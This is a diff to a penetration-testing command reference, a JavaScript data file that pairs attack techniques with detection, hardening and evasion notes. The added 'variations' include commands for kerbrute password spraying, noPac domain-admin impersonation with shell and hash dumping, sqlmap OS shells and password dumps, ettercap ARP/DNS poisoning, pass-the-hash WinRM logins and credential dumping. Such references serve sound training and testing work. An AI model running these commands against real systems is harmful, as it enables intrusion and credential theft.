@@ -3457,7 +3457,17 @@ const COMMAND_DATA = {
           "MITRE T1595"
         ],
         "evasion": "Throttle and randomize the screenshot/probe sweep; use a normal User-Agent; scope to in-scope hosts to avoid a fan-out pattern."
-      }
+      },
+      "variations": [
+        {
+          "label": "Larger port set",
+          "command": "cat web_discovery.xml | ./aquatone -nmap -ports large"
+        },
+        {
+          "label": "Plain host list",
+          "command": "cat hosts.txt | ./aquatone"
+        }
+      ]
     },
     {
       "id": "cdsa-m08-arp-attacks",
@@ -8374,7 +8384,17 @@ const COMMAND_DATA = {
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout",
         "evasion": "Offline/local activity — generate lists off-target; no on-network footprint."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Include words containing numbers",
+          "command": "cewl <url> -d <depth> -m <min_length> --with-numbers -w wordlist.txt"
+        },
+        {
+          "label": "Harvest emails from the site",
+          "command": "cewl <url> -d <depth> -e --email_file emails.txt -w wordlist.txt"
+        }
+      ]
     },
     {
       "id": "ad-printerbug-enum",
@@ -15380,7 +15400,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# BIND (named) — zone transfer unrestricted (vulnerable):\n# /etc/bind/named.conf or named.conf.local:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { any; };  // <-- allows AXFR from ANY host = zone exposure\n};\n\n# Windows DNS — no transfer restriction:\n# DNS Manager -> Zone -> Properties -> Zone Transfers tab:\n# 'Allow zone transfers' checked, 'To any server' selected",
         "secure_config": "# BIND — restrict zone transfers to secondary DNS IPs only:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { 10.10.1.5; 10.10.1.6; };  // only secondary DNS servers\n    // Or disable entirely if using AD-integrated zones:\n    // allow-transfer { none; };\n};\n\n# Windows DNS (integrated zones) — disable zone transfers:\n# DNS Manager -> Zone -> Properties -> Zone Transfers:\n# Uncheck 'Allow zone transfers' entirely (AD-integrated zones replicate via AD replication)\n\n# Additional hardening:\n# Disable DNS recursion for external clients\n# Response Rate Limiting (RRL) to prevent DNS amplification\n# Split-horizon DNS — internal and external zones serve different records"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Poison a remote gateway (SNAT)",
+          "command": "ettercap -T -q -i <interface> -P dns_spoof -M arp:remote //<target>// //<gateway>//"
+        }
+      ]
     },
     {
       "type": "command",
@@ -15844,7 +15870,17 @@ const COMMAND_DATA = {
         "secure_config": "# Use private CAs for internal certificates (don't log to CT)\n# Or: use cert.pem with SAN list limited to public subdomains only\n\n# Split DNS: internal names only resolve from internal DNS servers\n# External DNS zone: only public hostnames\n# Internal DNS zone: all hostnames (served only to internal clients)\n\n# Remove wildcard DNS records unless required\n# Restrict zone transfer to secondary servers only\n# Use subresource integrity + HTTPS for all public-facing apps",
         "evasion": "Use passive sources first (cert transparency, public records); rate-limit active zone-transfer/brute attempts; a single AXFR attempt is quiet, brute-forcing is not."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "All sources + save output",
+          "command": "subfinder -d <domain> -all -o subs.txt"
+        },
+        {
+          "label": "Enumerate a list of domains",
+          "command": "subfinder -dL domains.txt -silent"
+        }
+      ]
     },
     {
       "type": "command",
@@ -20836,7 +20872,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# WMI namespace with broad remote access:\n# Default WMI namespace security — 'Remote Enable' granted to local admins\n# Any account with local admin can:\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe' -ComputerName target\n\n# WinRM enabled (common on servers):\n# winrm quickconfig (enables WinRM on all interfaces)\n# Any local admin can: Enter-PSSession -ComputerName target -Credential admin",
         "secure_config": "# Restrict WMI remote access (namespace ACL):\n# WMI Control (wmimgmt.msc) -> Root\\CIMV2 -> Security:\n# Remove 'Remote Enable' from non-admin groups\n# Only grant specific service accounts the 'Execute Methods' right\n\n# Restrict WinRM to specific hosts/subnets:\n# New-Item -Path WSMan:\\localhost\\Listener\\* -Transport HTTP -Force\n# Set-Item -Path WSMan:\\localhost\\Listener\\*\\Address -Value 10.10.1.0/24\n\n# Disable WinRM on workstations (leave enabled only on servers that need it):\nDisable-PSRemoting -Force\n\n# Monitor WMI persistence:\n# Event 5861 (WMI event subscription created)\n# Event 4688 (Process creation via WMI) — look for wmiprvse.exe as parent\n\n# Firewall — block WMI ports from non-admin subnets:\n# New-NetFirewallRule -Name 'Block WMI Remote' -Direction Inbound -Protocol TCP -LocalPort 135 -Action Block"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Password auth",
+          "command": "evil-winrm -i <ip> -u <user> -p '<password>'"
+        },
+        {
+          "label": "SSL + load scripts/binaries",
+          "command": "evil-winrm -i <ip> -u <user> -H <nt_hash> -S -s /scripts/ -e /binaries/"
+        }
+      ]
     },
     {
       "id": "ad-evil-winrm",
@@ -21071,7 +21117,17 @@ const COMMAND_DATA = {
           "MITRE T1595"
         ],
         "evasion": "Throttle and randomize the screenshot/probe sweep; use a normal User-Agent; scope to in-scope hosts to avoid a fan-out pattern."
-      }
+      },
+      "variations": [
+        {
+          "label": "Screenshot a URL list",
+          "command": "eyewitness --web -f urls.txt -d <output_dir>"
+        },
+        {
+          "label": "All protocols (RDP/VNC/web)",
+          "command": "eyewitness --all-protocols -x web_discovery.xml -d <output_dir>"
+        }
+      ]
     },
     {
       "id": "feroxbuster-recursive",
@@ -25909,7 +25965,13 @@ const COMMAND_DATA = {
         "secure_config": "# Web apps — use bcrypt/Argon2 (adaptive, memory-hard):\nimport bcrypt\n# Hashing:\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n# Verification (slow by design):\nbcrypt.checkpw(password.encode(), hashed)\n\n# Python — Argon2 (winner of Password Hashing Competition):\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash = ph.hash(password)\nph.verify(hash, password)\n\n# For AD/Windows: enforce Kerberos AES instead of RC4:\n# Disable RC4 in Group Policy\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Network security: Configure encryption types allowed for Kerberos'\n#   = AES128_HMAC_SHA1 + AES256_HMAC_SHA1 ONLY (uncheck RC4_HMAC_MD5)\n\n# Implement LAPS for local admin passwords\n# Regular credential rotation for service accounts",
         "evasion": "Offline/local activity — generate lists off-target; no on-network footprint."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Combine multiple rule files",
+          "command": "hashcat -a 0 -m <mode> <hash> <wordlist> -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule"
+        }
+      ]
     },
     {
       "id": "hashcat-hash-modes",
@@ -26073,7 +26135,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# NTLM hash — no salt, instantaneous lookup with rainbow tables:\n# Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# 'password' -> hash computed in microseconds (MD4 algorithm)\n# 4x RTX 3090 GPUs: ~300 GH/s NTLM = 8-char complex password cracks in hours\n\n# Web app MD5 password storage:\n# $password = md5($_POST['password']);\n# Bcrypt would take 1000x longer per attempt for attacker",
         "secure_config": "# Web apps — use bcrypt/Argon2 (adaptive, memory-hard):\nimport bcrypt\n# Hashing:\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n# Verification (slow by design):\nbcrypt.checkpw(password.encode(), hashed)\n\n# Python — Argon2 (winner of Password Hashing Competition):\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash = ph.hash(password)\nph.verify(hash, password)\n\n# For AD/Windows: enforce Kerberos AES instead of RC4:\n# Disable RC4 in Group Policy\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Network security: Configure encryption types allowed for Kerberos'\n#   = AES128_HMAC_SHA1 + AES256_HMAC_SHA1 ONLY (uncheck RC4_HMAC_MD5)\n\n# Implement LAPS for local admin passwords\n# Regular credential rotation for service accounts"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Custom charsets (-1/-2)",
+          "command": "hashcat -a 3 -m <mode> <hashfile> -1 ?l?u -2 ?d?s '?1?1?1?1?2?2'"
+        },
+        {
+          "label": "Incremental length",
+          "command": "hashcat -a 3 -m <mode> <hashfile> '?a?a?a?a?a?a' --increment --increment-min 4 --increment-max 6"
+        }
+      ]
     },
     {
       "id": "hashcat-rule-functions",
@@ -26247,7 +26319,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# NTLM hash — no salt, instantaneous lookup with rainbow tables:\n# Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# 'password' -> hash computed in microseconds (MD4 algorithm)\n# 4x RTX 3090 GPUs: ~300 GH/s NTLM = 8-char complex password cracks in hours\n\n# Web app MD5 password storage:\n# $password = md5($_POST['password']);\n# Bcrypt would take 1000x longer per attempt for attacker",
         "secure_config": "# Web apps — use bcrypt/Argon2 (adaptive, memory-hard):\nimport bcrypt\n# Hashing:\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n# Verification (slow by design):\nbcrypt.checkpw(password.encode(), hashed)\n\n# Python — Argon2 (winner of Password Hashing Competition):\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash = ph.hash(password)\nph.verify(hash, password)\n\n# For AD/Windows: enforce Kerberos AES instead of RC4:\n# Disable RC4 in Group Policy\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Network security: Configure encryption types allowed for Kerberos'\n#   = AES128_HMAC_SHA1 + AES256_HMAC_SHA1 ONLY (uncheck RC4_HMAC_MD5)\n\n# Implement LAPS for local admin passwords\n# Regular credential rotation for service accounts"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Show JtR format too (-j)",
+          "command": "hashid -j '<hash>'"
+        },
+        {
+          "label": "From a file, hashcat+JtR+extended",
+          "command": "hashid -mje hashes.txt"
+        }
+      ]
     },
     {
       "type": "command",
@@ -32705,7 +32787,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Password spray",
+          "command": "kerbrute passwordspray --dc <dc_ip> --domain <domain> <users_file> '<password>'"
+        },
+        {
+          "label": "Brute-force one user",
+          "command": "kerbrute bruteuser --dc <dc_ip> --domain <domain> <wordlist> <username>"
+        }
+      ]
     },
     {
       "id": "ad-kerbrute-spray",
@@ -36444,7 +36536,13 @@ const COMMAND_DATA = {
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
         "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Bash version",
+          "command": "sudo bash mimipenguin.sh"
+        }
+      ]
     },
     {
       "id": "linikatz",
@@ -38084,7 +38182,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SSH — password auth enabled, no rate limiting:\n# /etc/ssh/sshd_config:\nPasswordAuthentication yes       # allows password-based login\nMaxAuthTries 6                   # only 6 per connection, but hydra opens new connections\nLoginGraceTime 120               # 2 minutes per attempt\n# No fail2ban, no AllowUsers whitelist",
         "secure_config": "# SSH — disable password auth entirely, use keys only:\n# /etc/ssh/sshd_config:\nPasswordAuthentication no\nPubkeyAuthentication yes\nPermitRootLogin prohibit-password\nAllowUsers deploy ops-admin      # whitelist\n\n# fail2ban for SSH:\n# /etc/fail2ban/jail.local:\n[sshd]\nenabled = true\nmaxretry = 3\nfindtime = 300\nbantime = 3600\n\n# For HTTP forms:\n# Rate limit + CAPTCHA after 3 failures\n# Account lockout (10 attempts, 30-min unlock)\n# MFA (TOTP) as primary defense"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Test empty / username-as-password",
+          "command": "medusa -h <host> -U <userlist> -e ns -M web-form -m FORM:\"<params>:F=<fail_text>\""
+        },
+        {
+          "label": "HTTP basic auth",
+          "command": "medusa -h <host> -u <user> -P <wordlist> -M http -m DIR:/protected"
+        }
+      ]
     },
     {
       "id": "cdsa-m13-memory-forensics",
@@ -49458,6 +49566,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "noPac"
+      ],
+      "variations": [
+        {
+          "label": "Exploit -> impersonate DA + shell",
+          "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator"
+        },
+        {
+          "label": "Exploit -> dump hashes",
+          "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump"
+        }
       ]
     },
     {
@@ -51413,7 +51531,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Live capture from an interface",
+          "command": "sudo ./Pcredz -i <interface> -v"
+        }
+      ]
     },
     {
       "id": "pentest-lifecycle",
@@ -53017,7 +53141,13 @@ const COMMAND_DATA = {
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
         "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Scan a specific host list",
+          "command": "Invoke-HuntSMBShares -Threads 100 -HostList C:\\hosts.txt -OutputDirectory C:\\Users\\Public"
+        }
+      ]
     },
     {
       "id": "ad-acl-pscredential",
@@ -70958,7 +71088,13 @@ const COMMAND_DATA = {
         "prevention": "CSRF tokens are NOT a SQLi control. Use parameterized queries. CSRF protection serves a different purpose (preventing cross-site attacks) and must be maintained alongside SQLi fixes.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Fetch token from a separate URL",
+          "command": "sqlmap -u \"http://<target>/\" --data=\"id=1&token=x\" --csrf-token=\"token\" --csrf-url=\"http://<target>/form\" --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-crawl-forms",
@@ -71134,7 +71270,17 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries eliminate the injection point entirely. Even if somehow reached, least-privilege DB user cannot access mysql.user or super_priv — --is-dba returns false.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Enumerate DB users, privs, roles",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --users --privileges --roles --batch"
+        },
+        {
+          "label": "Check DBA only",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --is-dba --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-basic-scan",
@@ -71421,7 +71567,13 @@ const COMMAND_DATA = {
         "prevention": "App DB account must NOT have access to mysql.user — least-privilege GRANT eliminates this entirely. Strong DB admin passwords resist offline cracking. MySQL: disable mysql.user access for app accounts.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Only the current DB user's hash",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --passwords -U CURRENT_USER --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-dump-all",
@@ -71607,7 +71759,17 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries. INFORMATION_SCHEMA cannot be fully blocked at the SQL user level — DB instance isolation per application is the architectural control.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Skip system DBs",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --schema --exclude-sysdbs --batch"
+        },
+        {
+          "label": "Count rows per table",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --count -D <db> --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-dump",
@@ -71976,7 +72138,13 @@ const COMMAND_DATA = {
         "prevention": "Never trust any HTTP input: headers, cookies, Referer, User-Agent are all SQL injection vectors if passed to queries. Parameterized queries cover all of these.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Verbose payload trace",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --level=5 --risk=3 -v 3 --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-cookie",
@@ -73341,7 +73509,13 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries prevent UNION injection. UNION-based attacks require visible output — applications that always return fixed-format responses regardless of query results are naturally resistant (but still vulnerable to other techniques).",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Force UNION source table",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --union-cols=5 --union-from=users --dbms=MySQL --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-waf-bypass",
@@ -73528,7 +73702,17 @@ const COMMAND_DATA = {
         "prevention": "Revoke FILE privilege. Set secure_file_priv to a non-web-accessible path. Web root directory: web server user should not have write permission (deploy via CI/CD pipeline, not directly writable). File integrity monitoring on web directories. Parameterized queries eliminate the prerequisite.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Interactive OS shell (RCE)",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell"
+        },
+        {
+          "label": "Interactive SQL shell",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --sql-shell"
+        }
+      ]
     },
     {
       "type": "command",
@@ -80534,7 +80718,17 @@ const COMMAND_DATA = {
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout",
         "evasion": "Low-and-slow, respect lockout thresholds, spray one credential widely rather than many against one account, and prefer protocols without logging where valid."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Pick a specific format",
+          "command": "./username-anarchy --select-format first.last -i <names_file>"
+        },
+        {
+          "label": "Generate from a single name",
+          "command": "./username-anarchy Jane Doe"
+        }
+      ]
     },
     {
       "id": "ad-username-generator",
@@ -82220,7 +82414,21 @@ const COMMAND_DATA = {
         "misconfiguration": "Web application and infrastructure information is inadvertently exposed: verbose HTTP headers (Server, X-Powered-By) revealing exact version numbers, directory listing enabled on web servers, .git repositories or .env files accessible in the web root, robots.txt listing sensitive paths, and WHOIS data exposing internal contact details.",
         "vulnerable_config": "# Apache with version disclosure in headers:\n# HTTP response: Server: Apache/2.4.41 (Ubuntu)\n# X-Powered-By: PHP/7.4.3  <-- exact version, enables targeted exploit search\n\n# Directory listing enabled:\n# nginx: autoindex on;  <- any directory without index.html lists files\n# Apache: Options +Indexes\n\n# .git accessible from web root:\n# http://target.com/.git/config  -- exposes repo + credentials in config\n# http://target.com/.env  -- exposes DB_PASSWORD, API keys",
         "secure_config": "# Apache — remove version disclosure:\n# /etc/apache2/conf-enabled/security.conf:\nServerTokens Prod          # shows only 'Apache' not version\nServerSignature Off        # removes version from error pages\n\n# nginx:\nserver_tokens off;         # hides nginx version\n\n# Disable directory listing:\n# Apache: Options -Indexes\n# nginx: remove 'autoindex on' from all location blocks\n\n# Block sensitive files/directories:\n# Apache:\n<DirectoryMatch '(\\.git|\\.env|\\.svn|backup|config)'>\n    Require all denied\n</DirectoryMatch>\n\n# nginx:\nlocation ~* /(\\.git|\\.env|\\.svn|backup\\/) { deny all; return 404; }\n\n# Remove X-Powered-By header:\n# PHP: expose_php = Off (php.ini)"
-      }
+      },
+      "variations": [
+        {
+          "label": "waybackurls",
+          "command": "waybackurls <domain> | sort -u"
+        },
+        {
+          "label": "gau (GetAllURLs, incl. subdomains)",
+          "command": "gau --subs <domain>"
+        },
+        {
+          "label": "Wayback CDX API",
+          "command": "curl -s \"http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey\""
+        }
+      ]
     },
     {
       "id": "web-attacks-skills-chain",
@@ -88368,7 +88576,17 @@ const COMMAND_DATA = {
         "artifacts": "Access log: XSStrike scan traffic — many requests with payloads like <HtMl%09onPoIntERENTER+=+confirm()>. WAF log: automated scanner signatures.",
         "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Crawl the whole site",
+          "command": "python xsstrike.py -u \"<url>\" --crawl"
+        },
+        {
+          "label": "Test POST parameters",
+          "command": "python xsstrike.py -u \"<url>\" --data \"task=test\""
+        }
+      ]
     },
     {
       "id": "xss-deface-bg-color",
@@ -89430,7 +89648,17 @@ const COMMAND_DATA = {
         "impact": "Persistent cookie harvesting infrastructure — every user who views the XSS-infected page has their session cookie logged. If multiple admin users visit, all admin sessions are captured. Cookies.txt accumulates all victim sessions for later replay.",
         "detection": "[MITRE T1059.007] Egress monitoring: multiple users' browsers making outbound GET requests to the same external IP. SIEM: correlation of same destination URL in multiple users' proxy logs. HttpOnly cookie flag: document.cookie empty, logged cookies show only non-HttpOnly cookies.",
